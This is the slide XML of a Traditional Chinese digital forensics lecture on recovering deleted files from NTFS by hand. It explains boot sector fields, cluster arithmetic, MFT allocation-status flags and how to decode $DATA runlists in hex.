            <a:ext cx="7900687" cy="5925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9308226" name=""/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3"/>
          <a:srcRect l="0" t="6944" r="0" b="50000"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm flipH="0" flipV="0">
            <a:off x="238124" y="952499"/>
            <a:ext cx="5733106" cy="4388303"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="2025244319" name=""/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3"/>
          <a:srcRect l="0" t="51339" r="0" b="9474"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm flipH="0" flipV="0">
            <a:off x="6095999" y="1020535"/>
            <a:ext cx="5932929" cy="4269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029476" name="標題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zh-TW"/>
              <a:t>Digital Forensic</a:t>
            </a:r>
            <a:endParaRPr lang="zh-TW"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="780669921" name="副標題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zh-TW" sz="3600">
                <a:latin typeface="AR PL UKai TW"/>
                <a:ea typeface="AR PL UKai TW"/>
                <a:cs typeface="AR PL UKai TW"/>
              </a:rPr>
              <a:t>從</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3600">
                <a:latin typeface="AR PL UKai TW"/>
                <a:ea typeface="AR PL UKai TW"/>
                <a:cs typeface="AR PL UKai TW"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3600">
                <a:latin typeface="AR PL UKai TW"/>
                <a:ea typeface="AR PL UKai TW"/>
                <a:cs typeface="AR PL UKai TW"/>
              </a:rPr>
              <a:t>hex </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3600" u="none">
                <a:latin typeface="AR PL UKai TW"/>
                <a:ea typeface="AR PL UKai TW"/>
                <a:cs typeface="AR PL UKai TW"/>
              </a:rPr>
              <a:t>運算還原毀損檔案</a:t>
            </a:r>
            <a:endParaRPr u="sng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069288" name="Title 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="838197" y="249830"/>
            <a:ext cx="10515600" cy="1325561"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>檔案系統基礎 – base on NTFS</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2141974574" name=""/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="0" flipH="0" flipV="0">
            <a:off x="872631" y="1687762"/>
            <a:ext cx="10583431" cy="47857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94023" indent="-394023"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Sector - 磁區	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硬碟最小的讀寫單位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1194123" lvl="2" indent="-394023">
              <a:buFont typeface="Wingdings"/>
              <a:buChar char="Ø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位於 0x0B ~ 0x0C ，共 2 bytes，為 Little Endian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394023" indent="-394023">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
              <a:defRPr/>
            </a:pP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94023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Cluster - 叢集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794073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檔案系統一次分配的最小空間</a:t>
            </a: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	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1194123" lvl="2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Ø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位於 0x0D ，共 1 byte</a:t>
            </a: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94023" indent="-394023">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
              <a:defRPr/>
            </a:pP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94023" indent="-394023"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LCN(Logical Cluster Number) : 絕對位置 (offset / bytes)</a:t>
            </a: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94023" indent="-394023">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
              <a:defRPr/>
            </a:pP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94023" indent="-394023"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VCN(Virtual Cluster Number) : 檔案邏輯結構中的相對位置</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
              <a:latin typeface="AR PL UKai TW"/>
              <a:cs typeface="AR PL UKai T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9400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Demo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41415" name="Title 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="838197" y="199698"/>
            <a:ext cx="10515600" cy="1325561"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>單位換算</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="787582013" name=""/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="0" flipH="0" flipV="0">
            <a:off x="809455" y="1525260"/>
            <a:ext cx="10579982" cy="5212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94023" indent="-394023"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Bytes per Sector</a:t>
            </a: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794073" lvl="1" indent="-394023">
              <a:buFont typeface="Wingdings"/>
              <a:buChar char="Ø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將 “00 02”反轉為 0x0200 ，換算為 512 bytes。</a:t>
            </a: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94023" indent="-394023"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Sectors per Cluster 	</a:t>
            </a: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794073" lvl="1" indent="-394023">
              <a:buFont typeface="Wingdings"/>
              <a:buChar char="Ø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08 = 8，換算為 8 bytes。</a:t>
            </a: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94023" indent="-394023"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Cluster Size = Bytes per Sector × Sectors per Cluster</a:t>
            </a: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            	= 512 × 8</a:t>
            </a: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            	= 4,096 bytes</a:t>
            </a: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94023" indent="-394023"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Byte Offset = LCN × Cluster Size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             </a:t>
            </a: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= LCN × 4,096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924897" name="Title 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="838197" y="216409"/>
            <a:ext cx="10515600" cy="1325561"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>檔案狀態判斷</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1120158383" name=""/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="0" flipH="0" flipV="0">
            <a:off x="839210" y="1704473"/>
            <a:ext cx="1051128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548068964" name=""/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="0" flipH="0" flipV="0">
            <a:off x="839210" y="1721184"/>
            <a:ext cx="10556280" cy="1798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94023" indent="-394023">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•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只有第一個 byte 從 4E 變成 E5，其他不動。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E5 僅為刪除的「標記」，</a:t>
            </a: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metadata 依舊留存直至被覆蓋。 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>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr sz="280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94023" indent="-394023">
              <a:buFont typeface="Wingdings"/>
              <a:buChar char="Ø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系統告訴檔案：這個位置/空間可以使用了。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</p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="164441507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28494" y="3727910"/>
            <a:ext cx="10748552" cy="26550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298483" name="Title 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="771355" y="249830"/>
            <a:ext cx="10515600" cy="1325561"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-TW" sz="4400" b="1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檔案狀態判斷</a:t>
            </a:r>
            <a:r>
              <a:rPr/>
              <a:t> - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-TW" sz="44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Deletion Flag</a:t>
            </a:r>
            <a:endParaRPr sz="4400"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1995501057" name=""/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="0" flipH="0" flipV="0">
            <a:off x="789078" y="1687762"/>
            <a:ext cx="10551751" cy="1798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94023" indent="-394023"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Allocation Status</a:t>
            </a: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</a:t>
            </a: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（配置狀態）</a:t>
            </a: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794073" lvl="1" indent="-394023">
              <a:buFont typeface="Wingdings"/>
              <a:buChar char="Ø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位於0x16，共 2 bytes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>
              <a:defRPr/>
            </a:pP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這個欄位的值代表：</a:t>
            </a:r>
            <a:endParaRPr sz="2800">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
              <a:latin typeface="AR PL UKai TW"/>
              <a:cs typeface="AR PL UKai TW"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="544076005" name=""/>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main"/>
          </p:cNvGraphicFramePr>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm rot="0">
          <a:off x="1892049" y="3868779"/>
          <a:ext cx="8127999" cy="259079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{F5AB1C69-6EDB-4FF4-983F-18BD219EF322}</a:tableStyleId>
              </a:tblPr>
              <a:tblGrid>
                <a:gridCol w="4063999"/>
                <a:gridCol w="4063999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/>
                    </a:p>
                    <a:p>
                      <a:pPr>
                        <a:defRPr/>
                      </a:pP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zh-TW" sz="2600" b="0" i="0" u="none" strike="noStrike" cap="none" spc="0">
                          <a:solidFill>
                            <a:srgbClr val="FF0000"/>
                          </a:solidFill>
                          <a:latin typeface="AR PL UKai TW"/>
                          <a:ea typeface="AR PL UKai TW"/>
                          <a:cs typeface="AR PL UKai TW"/>
                        </a:rPr>
                        <a:t>00 00</a:t>
                      </a:r>
                      <a:endParaRPr sz="2600">
                        <a:solidFill>
                          <a:srgbClr val="FF0000"/>
                        </a:solidFill>
                        <a:latin typeface="AR PL UKai TW"/>
                        <a:cs typeface="AR PL UKai TW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zh-TW" sz="2600" b="0" i="0" u="none" strike="noStrike" cap="none" spc="0">
                          <a:solidFill>
                            <a:srgbClr val="FF0000"/>
                          </a:solidFill>
                          <a:latin typeface="AR PL UKai TW"/>
                          <a:ea typeface="AR PL UKai TW"/>
                          <a:cs typeface="AR PL UKai TW"/>
                        </a:rPr>
                        <a:t>已刪除的檔案</a:t>
                      </a:r>
                      <a:endParaRPr sz="2600" b="0" i="0" u="none" strike="noStrike" cap="none" spc="0">
                        <a:solidFill>
                          <a:srgbClr val="FF0000"/>
                        </a:solidFill>
                        <a:latin typeface="AR PL UKai TW"/>
                        <a:cs typeface="AR PL UKai TW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zh-TW" sz="2600" b="0" i="0" u="none" strike="noStrike" cap="none" spc="0">
                          <a:solidFill>
                            <a:srgbClr val="002060"/>
                          </a:solidFill>
                          <a:latin typeface="AR PL UKai TW"/>
                          <a:ea typeface="AR PL UKai TW"/>
                          <a:cs typeface="AR PL UKai TW"/>
                        </a:rPr>
                        <a:t>01 00	</a:t>
                      </a:r>
                      <a:endParaRPr sz="2600">
                        <a:solidFill>
                          <a:srgbClr val="002060"/>
                        </a:solidFill>
                        <a:latin typeface="AR PL UKai TW"/>
                        <a:cs typeface="AR PL UKai TW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zh-TW" sz="2600" b="0" i="0" u="none" strike="noStrike" cap="none" spc="0">
                          <a:solidFill>
                            <a:srgbClr val="002060"/>
                          </a:solidFill>
                          <a:latin typeface="AR PL UKai TW"/>
                          <a:ea typeface="AR PL UKai TW"/>
                          <a:cs typeface="AR PL UKai TW"/>
                        </a:rPr>
                        <a:t>正常分配的檔案</a:t>
                      </a:r>
                      <a:endParaRPr sz="2600">
                        <a:solidFill>
                          <a:srgbClr val="002060"/>
                        </a:solidFill>
                        <a:latin typeface="AR PL UKai TW"/>
                        <a:cs typeface="AR PL UKai TW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zh-TW" sz="2600" b="0" i="0" u="none" strike="noStrike" cap="none" spc="0">
                          <a:solidFill>
                            <a:srgbClr val="FF0000"/>
                          </a:solidFill>
                          <a:latin typeface="AR PL UKai TW"/>
                          <a:ea typeface="AR PL UKai TW"/>
                          <a:cs typeface="AR PL UKai TW"/>
                        </a:rPr>
                        <a:t>02 00</a:t>
                      </a:r>
                      <a:endParaRPr sz="2600">
                        <a:solidFill>
                          <a:srgbClr val="FF0000"/>
                        </a:solidFill>
                        <a:latin typeface="AR PL UKai TW"/>
                        <a:cs typeface="AR PL UKai TW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zh-TW" sz="2600" b="0" i="0" u="none" strike="noStrike" cap="none" spc="0">
                          <a:solidFill>
                            <a:srgbClr val="FF0000"/>
                          </a:solidFill>
                          <a:latin typeface="AR PL UKai TW"/>
                          <a:ea typeface="AR PL UKai TW"/>
                          <a:cs typeface="AR PL UKai TW"/>
                        </a:rPr>
                        <a:t>已刪除的目錄</a:t>
                      </a:r>
                      <a:endParaRPr sz="2600">
                        <a:solidFill>
                          <a:srgbClr val="FF0000"/>
                        </a:solidFill>
                        <a:latin typeface="AR PL UKai TW"/>
                        <a:cs typeface="AR PL UKai TW"/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zh-TW" sz="2600" b="0" i="0" u="none" strike="noStrike" cap="none" spc="0">
                          <a:solidFill>
                            <a:srgbClr val="002060"/>
                          </a:solidFill>
                          <a:latin typeface="AR PL UKai TW"/>
                          <a:ea typeface="AR PL UKai TW"/>
                          <a:cs typeface="AR PL UKai TW"/>
                        </a:rPr>
                        <a:t>03 00	</a:t>
                      </a:r>
                      <a:endParaRPr sz="2600">
                        <a:solidFill>
                          <a:srgbClr val="002060"/>
                        </a:solidFill>
                        <a:latin typeface="AR PL UKai TW"/>
                        <a:cs typeface="AR PL UKai TW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zh-TW" sz="2600" b="0" i="0" u="none" strike="noStrike" cap="none" spc="0">
                          <a:solidFill>
                            <a:srgbClr val="002060"/>
                          </a:solidFill>
                          <a:latin typeface="AR PL UKai TW"/>
                          <a:ea typeface="AR PL UKai TW"/>
                          <a:cs typeface="AR PL UKai TW"/>
                        </a:rPr>
                        <a:t>正常分配的目錄</a:t>
                      </a:r>
                      <a:endParaRPr sz="2600">
                        <a:solidFill>
                          <a:srgbClr val="002060"/>
                        </a:solidFill>
                        <a:latin typeface="AR PL UKai TW"/>
                        <a:cs typeface="AR PL UKai TW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444680" name="Title 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="838197" y="233119"/>
            <a:ext cx="10515600" cy="1325561"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>檔案結構判讀</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1294068474" name=""/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="0" flipH="0" flipV="0">
            <a:off x="817968" y="1558681"/>
            <a:ext cx="10687282" cy="5212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94023" indent="-394023">
              <a:buFont typeface="Wingdings"/>
              <a:buChar char="ü"/>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-TW" sz="2800" b="1" i="0" u="sng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Target : manifest_0448.png</a:t>
            </a:r>
            <a:endParaRPr sz="280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>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="zh-TW"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94023" indent="-394023"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File Header : 46 49 4C 45 30 ( FILE0 的 ASCII) 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394023" indent="-394023"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Attribute : allocation status at 0x16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394023" indent="-394023"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File Name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394023" indent="-394023"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$DATA : 80 00 00 00 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>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="zh-TW"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94023" indent="-394023"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Runlist 映射表/配置表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$DATA 開頭往後數 64 bytes（0x40）為起點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1194123" lvl="2" indent="-394023">
              <a:buFont typeface="Wingdings"/>
              <a:buChar char="Ø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21 18 30 31 22 14 00 78 EC 21 0E 28 23 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-TW" sz="2800" b="0" i="0" u="none" strike="noStrike" cap="none" spc="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="AR PL UKai TW"/>
                <a:ea typeface="AR PL UKai TW"/>
                <a:cs typeface="AR PL UKai TW"/>
              </a:rPr>
              <a:t>00</a:t>
            </a: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endParaRPr lang="zh-TW"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94023" indent="-394023"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End : FF FF FF FF</a:t>
            </a:r>
            <a:endParaRPr sz="2800">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
              <a:latin typeface="AR PL UKai TW"/>
              <a:cs typeface="AR PL UKai T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9944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Demo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850903" name="Title 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="838197" y="193432"/>
            <a:ext cx="10515600" cy="1325561"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr/>
              <a:t>Runlist in VCN V.S in LCN</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="29606319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12391" y="2062681"/>
            <a:ext cx="10541405" cy="27326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060189058" name=""/>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main"/>
          </p:cNvGraphicFramePr>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm rot="0">
          <a:off x="232171" y="518318"/>
          <a:ext cx="11727654" cy="69214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837689"/>
                <a:gridCol w="837689"/>
                <a:gridCol w="837689"/>
                <a:gridCol w="837689"/>
                <a:gridCol w="837689"/>
                <a:gridCol w="837689"/>
                <a:gridCol w="837689"/>
                <a:gridCol w="837689"/>
                <a:gridCol w="837689"/>
                <a:gridCol w="837689"/>
                <a:gridCol w="837689"/>
                <a:gridCol w="837689"/>
                <a:gridCol w="837689"/>
                <a:gridCol w="837689"/>
              </a:tblGrid>
              <a:tr h="69215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21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18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30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31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22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14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00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78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EC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21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0E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28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23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rgbClr val="FF0000"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>00</a:t>
                      </a:r>
                      <a:endParaRPr sz="280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58276024" name=""/>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main"/>
          </p:cNvGraphicFramePr>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm rot="0">
          <a:off x="3596093" y="1737360"/>
          <a:ext cx="8127999" cy="3657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549921"/>
                <a:gridCol w="2549921"/>
              </a:tblGrid>
              <a:tr h="189404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600">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>2</a:t>
                      </a:r>
                      <a:endParaRPr sz="96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600">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>1</a:t>
                      </a:r>
                      <a:endParaRPr sz="96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95456038" name=""/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="0" flipH="0" flipV="0">
            <a:off x="1353749" y="2422228"/>
            <a:ext cx="162585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>
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Header</a:t>
            </a:r>
            <a:endParaRPr sz="2800">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="83954611" name=""/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="0" flipH="0" flipV="0">
            <a:off x="2603905" y="2579687"/>
            <a:ext cx="833437" cy="218280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465213077" name=""/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm flipH="1" flipV="0">
            <a:off x="3278593" y="3274218"/>
            <a:ext cx="654843" cy="714375"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="28575" cap="flat" cmpd="sng" algn="ctr">
            <a:solidFill>
              <a:srgbClr val="92D050">
                <a:alpha val="0"/>
              </a:srgb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2622794" name=""/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm flipH="0" flipV="0">
            <a:off x="8312555" y="3274218"/>
            <a:ext cx="621506" cy="714375"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="28575" cap="flat" cmpd="sng" algn="ctr">
            <a:solidFill>
              <a:srgbClr val="00B0F0">
                <a:alpha val="0"/>
              </a:srgb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4699473" name=""/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="0" flipH="0" flipV="0">
            <a:off x="1253903" y="3520894"/>
            <a:ext cx="1825552" cy="1371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>
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Left nibble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>
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Start byte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endParaRPr sz="2800">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1899896938" name=""/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="0" flipH="0" flipV="0">
            <a:off x="9087383" y="3520894"/>
            <a:ext cx="2552555" cy="1371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>
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Right nibble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>
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Length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endParaRPr sz="2800">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1190397525" name=""/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="0" flipH="0" flipV="0">
            <a:off x="2465129" y="4615042"/>
            <a:ext cx="8714472" cy="2072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71994" indent="-371994">
              <a:buFont typeface="Wingdings"/>
              <a:buChar char="ü"/>
              <a:defRPr/>
            </a:pP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21     → header : length 1 byte, start 2 bytes</a:t>
            </a:r>
            <a:endParaRPr sz="26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71994" indent="-371994">
              <a:buFont typeface="Wingdings"/>
              <a:buChar char="ü"/>
              <a:defRPr/>
            </a:pP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18     → length = 0x18 = 24（clusters）</a:t>
            </a:r>
            <a:endParaRPr sz="26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71994" indent="-371994">
              <a:buFont typeface="Wingdings"/>
              <a:buChar char="ü"/>
              <a:defRPr/>
            </a:pP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30 31  → start = 反轉為 0x3130 = 12,592（LCN)</a:t>
            </a:r>
            <a:endParaRPr lang="zh-TW" sz="26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>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="zh-TW" sz="26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371994" indent="-371994">
              <a:buFont typeface="Wingdings"/>
              <a:buChar char="Ø"/>
              <a:defRPr/>
            </a:pP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Run 1: LCN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（絕對值）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為 12,592, 長度為 24 clusters </a:t>
            </a:r>
            <a:endParaRPr sz="26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</p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9496740" name=""/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="0" flipH="0" flipV="0">
            <a:off x="1452340" y="4960937"/>
            <a:ext cx="10301334" cy="642135"/>
          </a:xfrm>
          <a:prstGeom prst="flowChartAlternateProcess">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="002060"/>
          </a:solidFill>
          <a:ln w="19050">
            <a:solidFill>
              <a:schemeClr val="bg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20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只有 RUN 1 為絕對值，其他皆基於 RUN 1 做相對偏移 </a:t>
            </a:r>
            <a:endParaRPr sz="3200">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
              <a:latin typeface="AR PL UKai TW"/>
              <a:cs typeface="AR PL UKai T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94967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496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9496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670527242" name=""/>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main"/>
          </p:cNvGraphicFramePr>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm rot="0">
          <a:off x="232170" y="518317"/>
          <a:ext cx="11727654" cy="69214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837688"/>
                <a:gridCol w="837688"/>
                <a:gridCol w="837688"/>
                <a:gridCol w="837688"/>
                <a:gridCol w="837688"/>
                <a:gridCol w="837688"/>
                <a:gridCol w="837688"/>
                <a:gridCol w="837688"/>
                <a:gridCol w="837688"/>
                <a:gridCol w="837688"/>
                <a:gridCol w="837688"/>
                <a:gridCol w="837688"/>
                <a:gridCol w="837688"/>
                <a:gridCol w="837688"/>
              </a:tblGrid>
              <a:tr h="69215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21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18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30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31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22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14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00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78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EC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21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0E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28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23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rgbClr val="FF0000"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>00</a:t>
                      </a:r>
                      <a:endParaRPr sz="280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98637364" name=""/>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main"/>
          </p:cNvGraphicFramePr>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm rot="0">
          <a:off x="1046531" y="1737360"/>
          <a:ext cx="5099841" cy="1894045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549920"/>
                <a:gridCol w="2549920"/>
              </a:tblGrid>
              <a:tr h="189404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600">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>2</a:t>
                      </a:r>
                      <a:endParaRPr sz="96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600">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>2</a:t>
                      </a:r>
                      <a:endParaRPr sz="96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56990799" name=""/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="0" flipH="0" flipV="0">
            <a:off x="933997" y="4158634"/>
            <a:ext cx="10424751" cy="246923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71994" indent="-371994">
              <a:buFont typeface="Wingdings"/>
              <a:buChar char="ü"/>
              <a:defRPr/>
            </a:pP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22    → header : length 2 bytes, start 2 bytes</a:t>
            </a:r>
            <a:endParaRPr sz="26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71994" indent="-371994">
              <a:buFont typeface="Wingdings"/>
              <a:buChar char="ü"/>
              <a:defRPr/>
            </a:pP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14 00 → length = 反轉為 0x0014 = 20（clusters）</a:t>
            </a:r>
            <a:endParaRPr sz="26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71994" indent="-371994">
              <a:buFont typeface="Wingdings"/>
              <a:buChar char="ü"/>
              <a:defRPr/>
            </a:pP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78 EC → start = 反轉為 0xEC78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(LCN) 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→ 負數</a:t>
            </a:r>
            <a:endParaRPr sz="26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829194" lvl="1" indent="-371994">
              <a:buFont typeface="Wingdings"/>
              <a:buChar char="Ø"/>
              <a:defRPr/>
            </a:pP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0xEC78 : 60536 - 0x10000(65536) = -5,000</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2600">
                <a:latin typeface="AR PL UKai TW"/>
                <a:ea typeface="AR PL UKai TW"/>
                <a:cs typeface="AR PL UKai TW"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
